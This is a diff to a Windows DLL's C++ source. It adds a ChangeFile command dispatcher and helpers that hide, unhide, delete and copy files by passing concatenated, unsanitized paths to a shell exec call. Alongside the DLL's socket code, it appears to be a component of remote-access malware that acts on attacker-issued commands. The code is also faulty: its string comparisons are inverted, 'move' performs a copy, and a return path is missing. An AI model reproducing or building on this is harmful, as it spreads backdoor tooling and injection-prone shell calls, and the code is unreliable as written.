@@ -13,6 +13,7 @@ vector<SOCKET*> sockets;
 //void CloseConnection(SOCKET s);
 //void NewFunction(std::string &ip_and_port);
 //string HideFileOrFolder(string pathtofileorfolder);
+//string ChangeFile(string file);
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
@@ -85,6 +86,28 @@ string OpenSocket(std::string ip_and_port)
 		t1.detach();
 	}
 }
+string ChangeFile(string cmd)
+{
+	vector<string> res = split(cmd);
+	vector<string>::iterator it = res.begin();
+	string typeofcommand = (*++it);
+	if (typeofcommand.compare("+h"))
+	{
+		return HideFileOrFolder(string((*it)));
+	}
+	if (typeofcommand.compare("-h"))
+	{
+		return UnHideFileOrFolder(string((*it)));
+	}
+	if (typeofcommand.compare("rm"))
+	{
+		return DeleteGivenFile(string((*it)));
+	}
+	if (typeofcommand.compare("move"))
+	{
+		return MoveGivenFileToDestination(string((*++it)), string((*it)));
+	}
+}
 /*
 	change attribute to hidden in file or folder
 */
@@ -95,10 +118,31 @@ string HideFileOrFolder(string pathtofileorfolder)
 	return exec(cmd);
 }
 
+/*
+	turn hidden file to not hidden
+*/
+string UnHideFileOrFolder(string pathtofileorfolder)
+{
+	string cmd = "attrib -h \"";
+	cmd.append(pathtofileorfolder).append("\"");
+	return exec(cmd);
+}
+/*
+	delete file
+*/
 string DeleteGivenFile(string pathtodelete)
 {
 	string cmd = "del \"";
 	cmd.append(pathtodelete).append("\"");
+	return exec(cmd);
+}
+/*
+	move filepath to other directory path
+*/
+string MoveGivenFileToDestination(string pathtofile, string Destination)
+{
+	string cmd = "copy \"";
+	cmd.append(pathtofile).append("\" \"").append(Destination).append("\"");
 	return exec(cmd);
 }
 
